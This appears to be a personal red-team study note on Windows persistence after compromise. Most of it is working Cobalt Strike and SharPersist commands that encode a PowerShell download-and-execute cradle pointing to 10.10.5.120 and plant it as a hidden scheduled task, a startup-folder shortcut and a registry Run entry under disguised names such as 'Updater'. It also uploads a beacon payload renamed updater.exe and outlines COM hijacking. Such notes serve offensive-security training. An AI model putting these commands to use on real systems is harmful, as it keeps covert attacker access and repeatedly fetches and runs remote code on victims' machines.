---
creation date: September 22nd 2022
last modified date: September 22nd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Host Persistence]]  
___

## Description:  
Persistence is a method of regaining or maintaining access to a compromised machine, without having to exploit the initial compromise steps all over again. Workstations are volatile since users tend to logout or reboot them frequently.



### Task Scheduler

Encoding the payload

In PowerShell:
```
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
```
In Linux:
```
root@kali:~# str='IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
root@kali:~# echo -en $str | iconv -t UTF-16LE | base64 -w 0
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
```

Schedule the task in the CobaltStike beacon:
```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly

[*] INFO: Adding scheduled task persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
[*] INFO: Scheduled Task Name: Updater
[*] INFO: Option: hourly
[+] SUCCESS: Scheduled task added

```

-   `-t` is the desired persistence technique.
-   `-c` is the command to execute.
-   `-a` are any arguments for that command.
-   `-n` is the name of the task.
-   `-m` is to add the task (you can also `remove`, `check` and `list`).
-   `-o` is the task frequency.



### Startup Folder
Applications, files and shortcuts within a user's startup folder are launched automatically when they first log in. It's commonly used to bootstrap the user's home environment (set wallpapers, shortcut's etc).

```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add

[*] INFO: Adding startup folder persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
[*] INFO: File Name: UserEnvSetup
[+] SUCCESS: Startup folder persistence created
[*] INFO: LNK File located at: C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
[*] INFO: SHA256 Hash of LNK file: B34647F8D8B7CE28C1F0DA3FF444D9B7244C41370B88061472933B2607A169BC

```

-   `-f` is the filename to save as.

### Registry AutoRun
AutoRun values in HKCU and HKLM allow applications to start on boot. You commonly see these to start native and 3rd party applications such as software updaters, download assistants, driver utilities and so on.

Generate a Windows EXE payload and upload it to the target.

```
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\beacon-http.exe
beacon> mv beacon-http.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

[*] INFO: Adding registry persistence
[*] INFO: Command: C:\ProgramData\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 
[+] SUCCESS: Registry persistence added
```

-   `-k` is the registry key to modify.
-   `-v` is the name of the registry key to create.


### COM Hijacking
Component Object Model (COM) is a technology built within the Windows operating system that allows intercommunication between software components of different languages.

COM hijacking comes into play when we are able to modify these entries to point to a different DLL - one that we control. So that when an application tries to call a particular coclass, instead of loading `C:\Windows\System32\ieframe.dll` (for example), it will load `C:\Temp\evil.dll` or whatever we specify.

The danger with hijacking COM objects like this is that you **will** break functionality. Hijacking a COM object without an understanding of what it does or what it's for is a very bad idea in a live environment.





### SharPersist

 [SharPersist](https://github.com/fireeye/SharPersist) is a Windows persistence toolkit written by FireEye. It's written in C#, so can be executed via `execute-assembly`



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 22nd 2022 (07:48 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
